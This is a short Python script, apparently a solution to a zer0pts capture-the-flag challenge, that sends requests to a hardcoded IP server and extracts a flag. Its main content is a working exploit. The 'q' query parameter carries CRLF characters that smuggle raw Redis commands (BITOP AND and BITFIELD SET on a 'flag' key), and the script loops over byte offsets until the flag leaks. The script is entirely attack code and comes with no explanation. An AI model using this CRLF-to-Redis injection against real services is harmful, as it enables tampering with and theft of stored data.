import requests
import os
import re
from binascii import hexlify

SERVER = 'http://3.112.201.75:8004'

r = requests.post(SERVER, data={
    "url": "http://example.com/"
    })
short = r.text.split("=")[1]

index = 8
while True:
    key = hexlify(os.urandom(8)).decode()
    requests.get(SERVER, params={
        "q": "{short}\n\r\nBITOP AND {key} flag flag\r\nBITFIELD {key} SET u8 #7 95 SET u8 #{index} 95\r\n".format(short=short, key=key, index=index)
    })
    try:
        r = requests.get(SERVER, params={
            "q": key
        })
        if len(r.text) > 0:
            print(re.findall("zer0pts[a-zA-Z0-9_\+\!\?]+", r.text))
            break
    except:
        pass
    index += 1
    print(index, key)

